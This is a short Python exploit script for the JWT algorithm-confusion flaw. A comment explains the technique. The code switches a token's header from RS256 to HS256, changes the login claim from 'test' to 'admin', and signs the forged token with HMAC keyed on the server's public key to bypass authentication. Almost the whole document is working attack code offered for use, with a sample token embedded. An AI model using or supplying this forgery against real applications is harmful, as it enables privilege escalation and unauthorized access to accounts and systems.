# This Script exploits a common vuln in JWT, when JWT is using any asymmetric key enc
# , we can force the application to use a symmetric one (eg. hmac) and easily bypass
# authentication/authorization based on JWT cookies. The application will use the
# public key as the secret for hmac verificatino and we can easily make our own
# signature if we know the public key

import base64
import hmac
import hashlib

TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3QifQ==.ZabKsEue5gDPyvwNnS8Xned104AR5V4LFaM4ApaLM9OvG2SEQbiiOwLvwFXM0mqAI7xoJXDosbjvNFzz21rthQDZseZkrw9Ogebbxr6b14wO6p64VQV0siBKroL_xWa8o5chkSru1kEEHAsEm5CaZvQlhshDvZc0gf-_eE0ZPudVO2j3ie_70dEqVCQJ5d86iYp5Ob0SRJdjpXNnYcmFnj9KOLnuM6TGzYExWqVRw2II2Iovjahq0IjacnnO47Hpixe8YHuTVZtzDTNLcqGvslNxYAq2efMWLktqM6rOU5k-CrtqVV3vc1bgcXmTOCI2_3FsnDQ2_hssWaocA18EEw"

with open("./public.pem", "r") as fd:
    pub = fd.read()
header, payload, signature = TOKEN.split(".")

decoded_header = base64.b64decode(header).decode()
decoded_header = decoded_header.replace("RS256", "HS256")
print(decoded_header)
new_header = base64.b64encode(decoded_header.encode())

decoded_payload = base64.b64decode(payload).decode()
decoded_payload = decoded_payload.replace("test", "admin")
print(decoded_payload)
new_payload = base64.b64encode(decoded_payload.encode())

data = new_header + ".".encode() + new_payload
sig = (
    base64.urlsafe_b64encode(
        hmac.new(bytes(pub, encoding="utf-8"), data, hashlib.sha256).digest()
    )
    .decode("UTF-8")
    .rstrip("=")
)
new_token = (data.decode()) + "." + sig
print(new_token)
